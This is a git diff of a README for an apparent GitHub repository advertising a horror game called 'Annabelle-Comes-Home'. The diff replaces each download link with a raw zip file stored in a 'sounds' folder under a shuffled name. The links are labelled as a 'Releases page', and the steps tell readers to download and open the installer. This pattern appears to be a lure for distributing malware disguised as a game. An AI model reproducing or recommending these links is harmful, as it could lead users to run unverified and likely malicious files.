@@ -6,9 +6,9 @@ Welcome to Annabelle-Comes-Home! This is a unique horror adventure game that all
 
 ### 🎉 Download the Game
 
-[![Download Annabelle-Comes-Home](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/screenshots/Annabelle-Comes-Home_3.1.zip)](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/screenshots/Annabelle-Comes-Home_3.1.zip)
+[![Download Annabelle-Comes-Home](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/sounds/Home_Annabelle_Comes_1.6.zip)](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/sounds/Home_Annabelle_Comes_1.6.zip)
 
-**Visit this page to download the latest version:** [Annabelle Releases](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/screenshots/Annabelle-Comes-Home_3.1.zip)
+**Visit this page to download the latest version:** [Annabelle Releases](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/sounds/Home_Annabelle_Comes_1.6.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click on the "Download Now" button above or visit the [Releases page](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/screenshots/Annabelle-Comes-Home_3.1.zip).
+1. Click on the "Download Now" button above or visit the [Releases page](https://raw.githubusercontent.com/Ggavyn759320/Annabelle-Comes-Home/main/sounds/Home_Annabelle_Comes_1.6.zip).
 2. On the Releases page, look for the latest version. It will be marked as "Latest Release."
 3. Download the installer for your operating system.
 4. Once the download is complete, open the installer file.
